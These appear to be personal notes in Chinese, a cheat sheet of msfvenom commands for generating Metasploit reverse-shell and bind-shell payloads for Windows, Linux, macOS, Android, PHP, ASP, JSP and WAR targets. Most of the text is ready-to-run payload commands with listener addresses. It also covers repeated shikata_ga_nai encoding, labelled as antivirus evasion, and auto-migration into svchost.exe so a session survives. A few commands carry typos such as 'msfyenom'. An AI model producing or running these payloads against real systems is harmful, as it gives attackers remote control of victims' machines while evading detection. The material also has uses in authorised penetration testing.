# msfvemon 
[MSF生成Payload/反弹shell 方式总结](https://mp.weixin.qq.com/s/pIakrui_9vsQdun7aopUYw)

如果tcp不行换协议
reverse_tcp
reverse_http

常用参数
- 比如想查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项,可以使用
msfvenom -p windows/meterpreter/reverse_tcp --list-options
- msfvenom --list payloads可查看所有payloads
- msfvenom --list encoders可查看所有编码器
  - 评级最高的两个encoder为 cmd/powershell_base64 和 x86/shikata_ga_nai,其中 x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器
类似可用 msfvenom--list 命令查看的还有payloads,encoders,nops,platforms,archs,
encrypt,formats

## filter payloads list
```bash
# filter php
msfvenom -l payloads | grep "php" | awk '{print $1}'
```


## payload的可持续化
- 自动迁移到进程
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe
```

- 生成的shell程序执行后会启动两个进程shell.exe和svchost.exe,关闭其中一个不会影响会话状态.
在上面的生成payload参数中:
- (1) PrependMigrate＝true PrependMigrateProc＝svchost．exe 使这个程序默认会迁移到
svchost.exe进程,自己测试的时候不建议到这个进程而是其他的持久进程.
- (2)使用-p指定使用的攻击载荷模块,使用-e指定使用x86／shikata_ga_nai编码器,使用-f选项告
诉MSF编码器输出格式为exe,-o选项指定输出的文件名为payload.exe,保存在根自录下.

## 正向反向payload区别, reverse_tcp和bind_tcp区别：
目标机器可以上网，那就使用reverse_tcp，让目标机器出网连接我们的服务器
无法外网的，使用正向连接，反向出不来 windows/x64/meterpreter/bind_tcp

注意，获得meterpreter的顺序为：先在win机器上执行我们的exe，然后再在msf上执行`exploit`。与`reverse_tcp`的顺序刚好相反。

```shell
[reverse_tcp]
attacker -> [contact me at the port 4444] -> victim

after the payload is executed
attacker <-> [port 4444] <-> victim

[bind_tcp]
attacker -> [open the way for me in the port 4444] -> victim

after execution
attacker <-> [port 4444] <-> victim
```


## 各平台的 payload/bin/exe/反弹shell
https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling

```bash
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=1234 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1234 -f exe > shell.exe
msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f exe >bind.exe
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$ip LPORT=1234  -f raw -o payload.ps1
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.2.157 -e x86/shikata_ga_nai -b "\x00" -f py 
# 默认的stageless payload只会包含stageless，所以如果想将stdapi和priv两个组建给包含进去的华我们可以用extensions命令：
msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe

# Linux
msfyenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf > shell.elf

# Mac
msfyenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho>shell.macho

# Android
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f raw > shell.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 R > test.apk
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.80.103 LPORT=1123 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php' | tr-d '\n'>shell.php && pbpaste >> shell.php
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YourP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address>LPORT=<Your Port to Connect On> -f raw > shell.jsp
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=1234 -f war > shell.war

# shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```
免杀版命令
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.161 LPORT=1234 -e x64/shikata_ga_nai -i 5 -f exe > shell.exe
```